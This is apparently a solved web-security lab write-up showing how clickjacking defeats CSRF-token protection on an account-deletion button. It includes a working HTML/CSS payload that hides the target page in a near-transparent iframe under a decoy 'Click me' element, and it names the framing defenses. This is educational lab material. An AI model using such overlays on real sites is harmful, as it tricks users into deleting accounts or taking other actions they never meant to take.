# Basic Clickjacking with CSRF Token Protection

**Difficulty:** Apprentice  
**Vulnerability:** Clickjacking (UI Redressing)  
**Topic:** Clickjacking with CSRF Token Protection  
**Status:** Solved ✅

## Overview

This lab demonstrates how clickjacking can be used to trick a victim into performing an unintended action, even when the target application implements CSRF token protection.

The application contains login functionality and a **Delete account** button. The deletion action is protected by a CSRF token, but this protection does not prevent clickjacking because the victim interacts with the legitimate website through an embedded iframe.

## Methodology

### 1. Login to the application

Logged in using the provided credentials and navigated to the **My Account** page.

Identified the Delete account button, which was the target of the clickjacking attack.

### 2. Create the exploit

Navigated to the exploit server and embedded the target account page inside an iframe.

Used CSS positioning and transparency to overlay the iframe with a decoy element displaying the text "Test me".

```html
<style>
    iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 1100px;
        height: 950px;
        opacity: 0.0001;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 500px;
        left: 50px;
        z-index: 1;
        pointer-events: none;
    }
</style>

<div>Click me</div>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account?id=wiener"></iframe>
```

### 3. Align the iframe

Adjusted the iframe dimensions and the position of the decoy element until the decoy text aligned with the underlying **Delete account** button.

Used a higher opacity temporarily to visually identify the target button and fine-tune its positioning.

Once correctly aligned, reduced the iframe opacity to make it almost completely transparent.

### 4. Deliver the exploit

Changed the decoy text to **Click me**, stored the exploit, and used the **Deliver exploit to victim** option on the exploit server.

The victim's interaction with the decoy element triggered the underlying Delete account button.

### 5. Verify the result

The lab displayed the **Solved** status.

## Key Takeaways

- Clickjacking is also known as UI redressing.
- An attacker can embed a legitimate website inside an iframe and manipulate its visual positioning.
- Transparent iframes can hide sensitive interface elements beneath decoy content.
- CSRF tokens do not inherently prevent clickjacking.
- CSS properties such as `position`, `z-index`, `opacity`, and `pointer-events` can be used to construct clickjacking exploits.
- Appropriate defenses include the `X-Frame-Options` header and the CSP `frame-ancestors` directive.

## Conclusion

Successfully exploited a clickjacking vulnerability by embedding the target application's account page inside a transparent iframe and aligning a decoy element with the Delete account button.

This demonstrated how an attacker can manipulate a victim's interactions with a legitimate application to trigger sensitive actions without their awareness.